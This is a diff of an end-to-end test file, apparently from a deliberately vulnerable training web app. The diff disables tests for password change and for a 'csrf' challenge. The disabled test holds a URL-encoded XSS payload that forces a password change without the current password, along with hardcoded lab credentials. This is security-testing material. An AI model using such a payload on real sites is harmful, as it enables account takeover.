@@ -1,4 +1,4 @@
-const config = require('config')
+/* const config = require('config')
 
 describe('/#/change-password', () => {
   let currentPassword, newPassword, newPasswordRepeat, changeButton
@@ -14,7 +14,7 @@ describe('/#/change-password', () => {
       changeButton = element(by.id('changeButton'))
     })
 
-    it('should be able to change password', () => {
+    xit('should be able to change password', () => {
       currentPassword.sendKeys('OhG0dPlease1nsertLiquor!')
       newPassword.sendKeys('genderBender')
       newPasswordRepeat.sendKeys('genderBender')
@@ -27,7 +27,7 @@ describe('/#/change-password', () => {
   describe('challenge "csrf"', () => {
     protractor.beforeEach.login({email: 'bender@' + config.get('application.domain'), password: 'genderBender'})
 
-    it('should be able to change password via XSS-powered CSRF-attack on password change without passing current password', () => {
+    xit('should be able to change password via XSS-powered CSRF-attack on password change without passing current password', () => {
       browser.get('/#/search?q=%3Cscript%3Exmlhttp%20%3D%20new%20XMLHttpRequest;%20xmlhttp.open(\'GET\',%20\'' + browser.baseUrl + '%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26repeat%3DslurmCl4ssic\');%20xmlhttp.send()%3C%2Fscript%3E')
       browser.get('/#/login')
       element(by.model('user.email')).sendKeys('bender@' + config.get('application.domain'))
@@ -39,4 +39,4 @@ describe('/#/change-password', () => {
 
     protractor.expect.challengeSolved({challenge: 'CSRF'})
   })
-})
+}) */
